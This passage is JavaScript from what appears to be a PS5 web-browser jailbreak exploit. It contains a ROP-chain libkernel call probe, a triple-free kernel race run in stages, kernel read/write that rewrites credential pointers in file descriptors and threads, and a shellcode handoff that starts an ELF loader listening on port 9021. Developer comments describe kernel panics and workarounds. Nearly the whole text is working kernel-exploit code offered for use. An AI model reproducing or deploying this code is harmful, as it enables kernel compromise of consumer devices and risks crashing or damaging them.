            for (let q = 0n; q < 0x100n; q += 8n) write64(attr + q, 0n);
            window.syncMark("PREFLIGHT", "B-PRE  call(scePthreadAttrInit, attr=" + toHex(attr)
                + ") *** THE CALL THAT KILLED v97 ***");
            const ri = call(kb + BigInt(O.lk_sce_attr_init), attr);
            window.syncMark("PREFLIGHT", "B-POST returned " + toHex(ri)
                + " attr[0]=" + toHex(read64(attr))
                + "  (compiled libkernel IS callable from a ROP chain)");

            window.syncMark("PREFLIGHT", "C-PRE  call(scePthreadAttrSetstacksize, 0x80000)");
            const rs = call(kb + BigInt(O.lk_sce_attr_stacksize), attr, 0x80000n);
            window.syncMark("PREFLIGHT", "C-POST returned " + toHex(rs));

            window.syncMark("PREFLIGHT", "D-PRE  call(scePthreadAttrSetdetachstate, 0)");
            const rd = call(kb + BigInt(O.lk_sce_attr_detach), attr, 0n);
            window.syncMark("PREFLIGHT", "D-POST returned " + toHex(rd));

            window.syncMark("PREFLIGHT", "E-PRE  call(scePthreadAttrDestroy)");
            const re = call(kb + BigInt(O.lk_sce_attr_destroy), attr);
            window.syncMark("PREFLIGHT", "E-POST returned " + toHex(re));

            // --- H. FULL REHEARSAL of kexp_spawn_pthread, minus the shellcode --------
            // If B..E returned, compiled libkernel is callable and the remaining question
            // is whether the WHOLE sequence works and produces a joinable real pthread.
            // This is exactly what kexp_spawn_pthread does - attr init / setstacksize /
            // detachstate / create / join - with a harmless entry (a bare `ret`, so the
            // thread returns immediately and libkernel's own trampoline runs pthread_exit).
            // A clean joinRet here means the kexp spawn is validated end to end except for
            // the shellcode itself, and that the thread kexp gets is a REAL pthread with a
            // REAL TCB - which is what v100 showed it needs.
            if (O.lk_sce_join < 0) {
                window.syncMark("PREFLIGHT", "H-SKIP no scePthreadJoin offset");
            } else {
                const h_attr = malloc(0x100);
                for (let q = 0n; q < 0x100n; q += 8n) write64(h_attr + q, 0n);
                const h_handle = malloc(8); write64(h_handle, 0n);
                const h_ret = malloc(8); write64(h_ret, 0n);
                const h_name = alloc_string("pfH");

                window.syncMark("PREFLIGHT", "H-PRE  full pthread rehearsal:"
                    + " attrInit/stacksize/detach/create/join");
                const h1 = call(kb + BigInt(O.lk_sce_attr_init), h_attr);
                const h2 = call(kb + BigInt(O.lk_sce_attr_stacksize), h_attr, 0x80000n);
                const h3 = call(kb + BigInt(O.lk_sce_attr_detach), h_attr, 0n);
                window.syncMark("PREFLIGHT", "H-ATTR init=" + toHex(h1)
                    + " stacksize=" + toHex(h2) + " detach=" + toHex(h3));

                const h4 = call(kb + BigInt(O.lk_sce_create), h_handle, h_attr, ROP.ret, 0n, h_name);
                const hh = read64(h_handle);
                window.syncMark("PREFLIGHT", "H-CREATE ret=" + toHex(h4) + " handle=" + toHex(hh)
                    + (h4 === 0n ? "  (0 = REAL pthread created)" : "  *** FAILED ***"));
                call(kb + BigInt(O.lk_sce_attr_destroy), h_attr);

                if (h4 === 0n) {
                    window.syncMark("PREFLIGHT", "H-JOIN-PRE handle=" + toHex(hh));
                    const h5 = call(kb + BigInt(O.lk_sce_join), hh, h_ret);
                    window.syncMark("PREFLIGHT", "H-POST joinRet=" + toHex(h5)
                        + " threadRet=" + toHex(read64(h_ret))
                        + (h5 === 0n
                            ? "  *** FULL PTHREAD PATH WORKS - kexp can have a real thread ***"
                            : "  *** join failed ***"));
                }
            }

            window.syncMark("PREFLIGHT", "DONE - all stages returned; nothing here is fatal");
        }
        // Stage 7's elfldr handoff. This REPLACES stage_load_elf_via_sandbox, which hunted
        // for an elfldr on /mnt/sandbox or /mnt/usb0..7, parsed it, and started a userland
        // thread at its entry with a 6-field payload_args. Two things were wrong with that:
        //   * we ARE the web host, so the payload comes over our own origin (read_file);
        //   * the 6-field payload_args ABI is poops's main.js 10.00 loader, which was proved
        //     never to execute on 12.00, so the whole handoff targeted an interface this
        //     firmware does not use. See the KEXP HANDOFF block above.
        // ipv6_kernel_rw is no longer built here either: it existed only to fill that ABI's
        // rwpair slot with an IPv6 master/victim socket pair. kexp takes the two PIPE pairs
        // p2jb already owns.
        async function stage_load_elf_via_kexp_shellcode(S) {
            await ulog("stage_elfldr: entered (kexp shellcode handoff - poops.js stage5 contract)");
            if (!S.data_base_ok) {
                await ulog("stage_elfldr: kernel data_base not resolved - skipped");
                send_notification("Stage 7\nelf loader skipped (no data_base)");
                return;
            }
            for (const [name, fd] of [["master_rfd", S.master_rfd], ["master_wfd", S.master_wfd],
                                      ["victim_rfd", S.victim_rfd], ["victim_wfd", S.victim_wfd]]) {
                if (typeof fd !== "number" || fd < 0) {
                    await ulog("stage_elfldr: " + name + " is " + fd + " - kexp needs both"
                        + " pipe pairs; skipped");
                    send_notification("Stage 7\nkexp: pipe fds missing\n(jailbreak still complete)");
                    return;
                }
            }
            try {
                kernel.addr.data_base = S.data_base;
                const r = await kexp_launch(S);
                if (r.spawn === "pthread") {
                    await ulog("stage_elfldr: kexp joined (joinRet=" + toHex(r.join_ret) +
                        " shellcodeRet=" + toHex(r.shell_ret) + ")");
                } else {
                    await ulog("stage_elfldr: kexp thread spawned (tid=" + toHex(r.tid) + ")");
                }
                await ulog("stage_elfldr: elfldr should now be listening on :9021");
                send_notification("Stage 7\nelfldr running - send your ELF to\n" +
                    "<ps5-ip>:9021");
            } catch (e) {
                await ulog("stage_elfldr: kexp handoff failed: " + e.message +
                    " (jailbreak unaffected)");
                send_notification("Stage 7\nkexp failed: " + e.message +
                    "\n(jailbreak still complete)");
            }
        }

        // stage_load_elf_via_kexp() (the Y2JB >=1.5 `load_aioshellcode` handoff) was
        // DELETED here. load_aioshellcode is a Y2JB host function that has never been in
        // scope in this runtime, so the function could only ever log and return - and its
        // name now collides with the real kexp path. stage_load_elf_via_kexp_shellcode()
        // above does the delivery itself.

        send_notification(p2jb_version + "\nport by matem6");

        {

            // This used to also require ipv6_kernel_rw and TITLE_ID|get_title_id. Both were
            // needs of the deleted sandbox loader: TITLE_ID located an elfldr inside a
            // game's sandbox, and ipv6_kernel_rw filled the 6-field payload_args' rwpair
            // slot. The kexp handoff reads the payloads from our own origin and passes the
            // pipe pairs p2jb already owns, so demanding either would abort a perfectly
            // runnable jailbreak over a helper nothing calls any more.
            if (typeof file_exists !== "function" ||
                typeof read_file !== "function") {
                await ulog("FATAL: payload helpers missing (file_exists / read_file)");
                send_notification("p2jb: payload helpers missing\n" +
                    "(adapter did not load)");
                return;
            }
        }

        try {
            if (typeof is_jailbroken === "function" && is_jailbroken()) {
                send_notification("p2jb: already jailbroken");
                return;
            }
            failcheck_path = "/" + get_nidpath() + "/common_temp/p2jb.fail";
            if (file_exists(failcheck_path) ||
                file_exists("/user/temp/common_temp/p2jb.fail")) {
                send_notification("p2jb already ran this boot - reboot your\n" +
                    "PS5 before running p2jb again");
                return;
            }
        } catch (_) { failcheck_path = null; }

        ensure_kernel_offset();

        my_init_threading();

        // ?preflight=1 - runs the libkernel-call probe HERE, before the 50-minute leak,
        // so the question that cost the v97 run is answered in ~2 minutes. Pair it with
        // ?skipleak=1. Off by default: it deliberately performs the call that killed
        // v97, so it must never fire during a real jailbreak attempt.
        if (/[?&]preflight=1/i.test(String(location.search || ""))) {
            try {
                await preflight_probe();
            } catch (e) {
                window.syncMark("PREFLIGHT", "threw: " + String(e && e.message).slice(0, 120));
            }
            if (/[?&]skipleak=1/i.test(String(location.search || ""))) {
                await ulog("preflight complete - stopping here (?skipleak=1)");
                send_notification("p2jb preflight done\nsee the host log");
                return;
            }
        }

        const S = make_state();
        S_ref = S;

        setup_cpu_masks(S);
        setup_worker_sockets(S);
        setup_iov_buffers(S);
        setup_uio_buffers(S);
        setup_pipes_kernrw(S);
        await ulog(p2jb_version + " - port by matem6");
        await ulog("pipes master=" + S.master_rfd + "," + S.master_wfd +
            " victim=" + S.victim_rfd + "," + S.victim_wfd);

        const leak_nw = LEAK_CORES.length;
        let eta_minutes;
        switch (leak_nw) {
            case 1: eta_minutes = 120; break;
            case 2: eta_minutes = 90; break;
            case 3: eta_minutes = 60; break;
            case 4: eta_minutes = 50; break;
            default: eta_minutes = Math.round(48 * 4 / leak_nw); break;
        }
        const eta_str = eta_minutes < 60
            ? "~" + eta_minutes + " min"
            : "~" + Math.floor(eta_minutes / 60) + "h" +
            (eta_minutes % 60 ? " " + (eta_minutes % 60) + " min" : "");

        const fmt_hm = d =>
            String(d.getHours()).padStart(2, '0') + ':' +
            String(d.getMinutes()).padStart(2, '0');
        const t_start = new Date();
        const t_eta = new Date(t_start.getTime() + eta_minutes * 60000);
        await ulog("host OK - starting " + leak_nw + "-core leak at " +
            fmt_hm(t_start) + ", ETA stage0 ~" + fmt_hm(t_eta) +
            " (" + eta_str + "); no further log output until then " +
            "(this is normal, do not interrupt)");

        // EARLY ELFLDR CHECK - hoisted here 2026-08-29 at the operator's request.
        // The authoritative check used to live at the top of prepare_fds(), which runs
        // AFTER setup_workers() spawns 12 racer threads pinned to MAIN_CORE at
        // PRI_REALTIME and AFTER apply_main_thread_pinning() puts the main thread on
        // that same core. On an ALREADY-JAILBROKEN console every bit of that was done
        // for nothing - and 13 realtime threads sharing one core is exactly the state
        // that produced the worker "WAKE timeout" (FAILS F52) and the operator's
        // "system software error" after the menu.
        // Ask the CONSOLE before touching anything: syscalls are already up at this
        // point (the ERRNO-CONVENTION beacon above proves it), and elfldr_alive() costs
        // one socket + connect + close. ?force=1 still overrides, same as before.
        if (!/[?&]force=1/i.test(location.search) && elfldr_alive()) {
            window.syncMark("ELFLDR-UP-EARLY",
                "connect(127.0.0.1:9021)=0 BEFORE setup_workers - already jailbroken;"
                + " skipping the exploit entirely, no racer threads spawned");
            try { localStorage.setItem("slopkit-poops:jb-at", String(Date.now())); } catch (e) { }
            try { sessionStorage.setItem("slopkit-poops:jb", "1"); } catch (e) { }
            window.liveStatus("ALREADY JAILBROKEN"
                + "\nelfldr is already listening on :9021"
                + "\nopening the payload menu - no exploit, no racer threads",
                100, "race");
            try { window.showWin(); } catch (e) { }
            S._skipped_jailbroken = true;
            return;
        }

        await setup_workers(S);
        setup_ipv6_spray(S);

        S.orig_main_core = get_current_core();
        await ulog("orig_main_core=" + S.orig_main_core);

        apply_main_thread_pinning(S);
        await prepare_fds(S);
        // prepare_fds bailed because elfldr is already up: the payload menu is
        // showing, so do not fall through into the triple-free race.
        if (S._skipped_jailbroken) return;
        // SKIPLEAK = PROTOCOL TEST ONLY. It must NEVER enter stage0: without the real
        // cr_ref overflow the triple-free frees a LIVE struct file and the kernel panics
        // ("panic: free of already freed object (Files)" - observed). So exercise only the
        // non-destructive worker wake/park protocol (signal -> write -> wait -> drain read),
        // which is the part suspected of deadlocking, then stop.
        if (_skipleak) {
            window.syncMark("PROTO", "start - flush_iov_workers x2 (no frees, no race)");
            flush_iov_workers(S, 2);
            window.syncMark("PROTO", "OK - wake/park/drain protocol completed, no deadlock");
            await ulog("skipleak: protocol test PASSED; stopping before stage0 (would panic without overflow)");
            return;
        }
        await stage0(S);

        await stage1(S);
        await stage2(S);
        await stage3(S);

        await stage4(S);
        await stage5(S);

        await stage6(S);
        await stage7(S);
        await stage_debug_menu(S);

        const yver = get_y2jb_version();
        await ulog("stage_elfldr: detected " +
            (yver ? yver.str : "Y2JB <unknown version_string>"));
        // The Y2JB-version fork is gone. It chose between two handoffs that both belong to
        // a Y2JB host we are not running on: >=1.5 called load_aioshellcode (never in scope
        // here, so it always logged and returned), and <1.5 went to the sandbox/USB elfldr
        // loader whose payload_args ABI 12.00 does not use. We serve the payloads ourselves
        // and run the contract poops proved on this firmware, so there is one path.
        /* SECURE THE CREDS BEFORE THE kexp SPAWN, NOT ONLY AFTER IT.
           Everything that makes teardown survivable used to live AFTER the join:
           migrate every fd f_cred and thread td_ucred off the freed cred A onto the live
           cred B, then overwrite A with a B-clone and pin cr_ref to 0x10000000. On a good
           run that is what lets fdescfree() walk the ~250 parked descriptors harmlessly.
           2026-08-28, 12.70 devkit, run rmtcsuq3c: the run reached KEXP-JOIN-PRE and the
           join never came back, so NONE of it ran. Every parked fd still held f_cred = A,
           and the reboot's fdescfree() walked them - UART counted down
           (ret=257,246,238,192,189,164,99,19,11) and then `Fatal trap 12`.
           PIN-EARLY is not enough on its own: it fires ~1600 lines earlier and only sets
           cr_ref, so anything that reallocates A's chunk in the minutes that follow leaves
           crfree decrementing a non-ucred object. Migration is the durable half, because
           afterwards nothing references A at all.
           p2jb.js already learned this once - the comment above PIN-EARLY says "ordering
           was the whole bug" - but only the pin was hoisted, not the migrate. This hoists
           the rest, so a stalled join costs the run and NOT the console.
           Deliberately NOT hoisted: the master.pipe_buffer NULL below. Those pipes are
           kexp's kernel R/W primitive; clearing the buffer before kexp would break it.
           Idempotent by construction - the migrate reports "nothing to migrate (all
           already on B)" on the second call - so it is safe to run on both sides. */
        const secureCredsOffA = async () => {
        try {
            const B = S.proc_ucred;
            if (B === 0n || (B >> 48n) !== 0xFFFFn) {
                await ulog("post-jb migrate: B invalid, skip");
            } else {

                const nfiles = Number(S.kread32(S.fd_ofiles - S.OFF.FDESCENTTBL_HDR) & 0xFFFFFFFFn);
                let fd_migrated = 0;
                const migrated_creds = new Set();
                if (nfiles > 0 && nfiles <= 0x10000) {
                    for (let i = 0; i < nfiles; i++) {
                        const fp = S.kread64(S.fd_ofiles + BigInt(i) * S.OFF.FILEDESCENT_SIZE);
                        if (fp === 0n || (fp >> 48n) !== 0xFFFFn) continue;
                        const fcred = S.kread64(fp + 0x10n);
                        if (fcred === B) continue;
                        if ((fcred >> 48n) !== 0xFFFFn) continue;
                        S.kwrite64(fp + 0x10n, B);
                        migrated_creds.add(toHex(fcred));
                        fd_migrated++;
                    }
                }
                await ulog("post-jb migrate: " + fd_migrated + " fds f_cred -> B " +
                    "(" + migrated_creds.size + " distinct cred kptrs replaced)");

                const TD_UCRED_OFF = 0x140n;
                let td_migrated = 0;
                const migrated_tcreds = new Set();
                const main_thread = S.kread64(S.curproc + 0x10n);
                if (main_thread !== 0n && (main_thread >> 48n) === 0xFFFFn) {
                    let td = main_thread, walked = 0;
                    while (td !== 0n && (td >> 48n) === 0xFFFFn && walked < 500) {
                        walked++;
                        if (S.kread64(td + 0x08n) !== S.curproc) {
                            await ulog("post-jb migrate: td_proc mismatch, abort thread walk");
                            break;
                        }
                        const tu = S.kread64(td + TD_UCRED_OFF);
                        if (tu !== B && (tu >> 48n) === 0xFFFFn) {
                            S.kwrite64(td + TD_UCRED_OFF, B);
                            migrated_tcreds.add(toHex(tu));
                            td_migrated++;
                        }
                        td = S.kread64(td + 0x10n);
                    }
                }
                await ulog("post-jb migrate: " + td_migrated + " threads td_ucred -> B " +
                    "(" + migrated_tcreds.size + " distinct cred kptrs replaced)");

                const total = fd_migrated + td_migrated;
                if (total > 0) {
                    const rc_old = Number(S.kread32(B) & 0xFFFFFFFFn);
                    S.kwrite32(B, rc_old + total);
                    await ulog("post-jb migrate: cr_ref(B) " +
                        ("0x" + rc_old.toString(16)) + " -> " +
                        ("0x" + (rc_old + total).toString(16)) +
                        " (+" + total + ")");
                } else {
                    await ulog("post-jb migrate: nothing to migrate (all already on B)");
                }
            }
        } catch (e) {
            await ulog("post-jb migrate: failed: " + e.message +
                " (jailbreak unaffected, close-KP may still fire)");
        }

        try {
            const A = S.ucred_A || 0n;
            const B = S.proc_ucred;
            if (A === 0n || (A >> 48n) !== 0xFFFFn) {
                await ulog("post-jb pin: A invalid (" + toHex(A) + "), skip");
            } else if (B === 0n || (B >> 48n) !== 0xFFFFn) {
                await ulog("post-jb pin: B invalid (" + toHex(B) + "), skip");
            } else if (A === B) {
                await ulog("post-jb pin: A == B (unexpected), skip");
            } else {
                const PIN_REFS = 0x10000000;
                const buf = malloc(UCRED_SIZE);

                S.kread(buf, B, UCRED_SIZE);
                const old_A_ref = (S.kread32(A) & 0xFFFFFFFFn);
                write32(buf, BigInt(PIN_REFS));
                S.kwrite(A, buf, UCRED_SIZE);

                const new_A_ref = (S.kread32(A) & 0xFFFFFFFFn);
                if (Number(new_A_ref) === PIN_REFS) {
                    await ulog("post-jb pin: A=" + toHex(A) +
                        " overwritten with B-clone, cr_ref " +
                        toHex(old_A_ref) + " -> 0x" + PIN_REFS.toString(16) +
                        " (stale freelist consumers now see safe ucred)");
                } else {
                    await ulog("post-jb pin: VERIFY FAILED, cr_ref(A)=" +
                        toHex(new_A_ref) + " (expected 0x" +
                        PIN_REFS.toString(16) + ")");
                }
            }
        } catch (e) {
            await ulog("post-jb pin: failed: " + e.message +
                " (jailbreak unaffected, close-KP may still fire)");
        }
        };

        /* BEFORE the spawn, on EVERY firmware. This is the console-safety half and it is
           deliberately unconditional - see the CORRECTION in main.js. Yes it writes kernel
           state (fd f_cred, thread td_ucred, pins cred A), but the alternative is worse:
           if the join stalls without it, every parked fd still points at the freed cred A
           and the next fdescfree() walk takes the kernel down with Fatal trap 12. It is
           idempotent, so calling it here AND after the join is safe.
           Only ?fw_credHoist=0 can disable it, for deliberate single-console testing. */
        if (!window.fwFlag || window.fwFlag("credHoist")) {
            await secureCredsOffA();
        } else {
            await ulog("post-jb: pre-spawn cred hoist DISABLED BY ?fw_credHoist=0 for fw "
                + window.fw_str + " - this console WILL panic if the join stalls");
        }

        await stage_load_elf_via_kexp_shellcode(S);

        // AFTER kexp - this one is where it has always been, so it runs unconditionally.
        await secureCredsOffA();


        try {
            const buf_before = S.kread64(S.master_pipe_data + 0x10n);
            S.kwrite64(S.master_pipe_data + 0x10n, 0n);
            await ulog("post-jb: master.pipe_buffer.buffer NULL'd " +
                "(was " + toHex(buf_before) + " = victim_pipe_data, " +
                "kernel free-path will now skip vm_map_remove)");
        } catch (e) {
            await ulog("post-jb: pipe_buffer restore failed: " + e.message +
                " (jailbreak unaffected)");
        }

        pin_to_core(S.orig_main_core);
        await ulog("restored main thread to core " + S.orig_main_core);

        await ulog("=== p2jb complete ===");

    } catch (e) {
        fatal_err = e;
        try { await log("p2jb FATAL: " + e.message); } catch (_) { }
        try { send_notification("p2jb FAILED: " + e.message); } catch (_) { }

        /* PANIC-AVOIDANCE ON ABORT.
         *
         * From stage1 onward, window.__p2jbPoisoned names a socket whose ip6po_rthdr
         * aliases a LIVE kqueue. Closing it makes the kernel free(kqueue, M_IP6OPT) on an
         * object still in use - a real panic, and the WebProcess exiting closes it for us.
         * So after an abort the dangerous act is ending the page: reload, back-out, close,
         * or a menu reboot all reach the same close().
         *
         * The one repair - clearing ip6po_rthdr with setsockopt - needs a syscall, and
         * every syscall goes through the executor. If the executor is what died, there is
         * no way to make teardown safe from here; a cold power-cycle never runs close().
         * Say so plainly instead of leaving the operator to reload and eat the panic. */
        try {
            if (window.__p2jbPoisoned !== undefined) {
                const wedged = /executor is dead|sync poll timed out/i.test(String(e && e.message));
                const warn = "socket " + window.__p2jbPoisoned + " still aliases a live kqueue"
                    + (wedged ? " and the executor is dead (cannot clear it)" : "")
                    + " - DO NOT reload/close this page or reboot from the menu;"
                    + " POWER-CYCLE the console (hold power, unplug) to avoid free(kqueue).";
                try { window.syncMark("ABORT-UNSAFE-TEARDOWN", warn); } catch (_) { }
                try { await log("p2jb: " + warn); } catch (_) { }
                try { send_notification("p2jb: unsafe to reload\n\nPower-cycle the console."); } catch (_) { }
            }
        } catch (_) { }
    } finally {
        /* TEARDOWN PANIC GUARD.
         *
         * master.pipe_buffer.buffer points at victim_pipe_data - memory that was never
         * carved out of pipe_map. pipeclose() inlines pipe_free_kmem(), which calls
         * vm_map_remove(pipe_map, buffer) on it and takes a Fatal trap 12. The page
         * navigating to the ELF loader closes those fds, so the panic lands *before*
         * that page appears - which is exactly how it gets reported.
         *
         * The success path above already NULLs it. This is the abort path: any throw
         * between stage5 and there skips that line and leaves the panic armed.
         *
         * Idempotent by construction - it re-reads first and only writes a non-zero
         * value, so a normal completion falls straight through and logs nothing.
         *
         * Skipped when the executor is dead: every kernel access goes through it, so a
         * read would hang rather than fail, and hanging here would be worse than the
         * panic warning the operator already gets. */
        try {
            /* OPT-IN ONLY (?teardownguard=1).
             *
             * This is the one thing on this page that touches kernel memory outside the
             * proven exploit path, and it has never fired on hardware. Tonight a different
             * post-kexp kernel write of mine - guarded the same way, on an address that
             * looked just as sound - panicked a console. The lesson applies here: an
             * unproven kernel access must not sit in the default path of a build people
             * rely on.
             *
             * With the flag absent, this block does nothing at all - not even the read -
             * so the kernel-access surface of a normal run is exactly what it was before
             * this guard existed. What that costs is the abort-path protection: after a
             * FAILED run, master.pipe_buffer.buffer is left pointing at victim_pipe_data
             * and closing the page can still take Fatal trap 12 in pipe_free_kmem. That is
             * the pre-existing behaviour, not a regression.
             *
             * To prove it, run with ?teardownguard=1 and abort deliberately: it should
             * report TEARDOWN-GUARD with the old value and a clean read-back. Once that
             * has been seen on hardware it can go back to being the default. */
            const guardOn = /[?&]teardownguard=1/i.test(String(location.search || ""));
            const wedged = /executor is dead|sync poll timed out/i.test(
                String((fatal_err && fatal_err.message) || ""));
            if (guardOn && S_ref && S_ref.master_pipe_data && !wedged) {
                const buf_now = S_ref.kread64(S_ref.master_pipe_data + 0x10n);
                if (buf_now !== 0n) {
                    S_ref.kwrite64(S_ref.master_pipe_data + 0x10n, 0n);
                    try {
                        window.syncMark("TEARDOWN-GUARD",
                            "master.pipe_buffer.buffer was " + buf_now.toString(16) +
                            "-NULLd-on-abort-path");
                    } catch (_) { }
                    try {
                        await log("post-jb guard: master.pipe_buffer.buffer was still " +
                            toHex(buf_now) + " on the abort path - NULL'd it, " +
                            "close() will no longer vm_map_remove non-pipe memory");
                    } catch (_) { }
                }
            }
        } catch (_) { }
    }
})();
